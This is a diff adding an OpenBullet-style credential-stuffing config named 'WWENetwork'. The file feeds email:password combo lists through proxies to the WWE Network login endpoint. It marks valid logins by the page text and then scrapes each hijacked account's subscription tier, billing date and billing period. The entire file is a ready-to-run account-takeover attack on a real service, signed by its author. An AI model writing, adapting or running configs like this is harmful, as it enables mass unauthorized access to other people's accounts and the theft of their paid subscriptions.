@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "WWENetwork",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-04T08:47:39.8271947+01:00",
+  "AdditionalInfo": "",
+  "Author": "IpProxeis",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#بيقولك REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#مره REQUEST POST "https://secure.net.wwe.com/workflow.do" 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+  HEADER "Referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+
+#واحد KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Error. Please check email and/or password and try again" 
+  KEYCHAIN Success OR 
+    KEY "My Profile" 
+
+#زبو_نام REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+
+#بضانو KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Your next billing date is " 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<p>You are not currently subscribed to <b>WWE Network</b>.</p>" 
+
+#اتسرقت PARSE "<SOURCE>" LR "Your next billing date is <b>" "</b>" -> CAP "ReNew" 
+
+#بيس PARSE "<SOURCE>" LR "<p>You will be billed" "." -> CAP "Duration of sub" 
+
+#يمان PARSE "<SOURCE>" LR "<p>You are currently subscribed to <b>" "</b>" -> CAP "Sub To" "" " ^^By IpProxeis" 
+
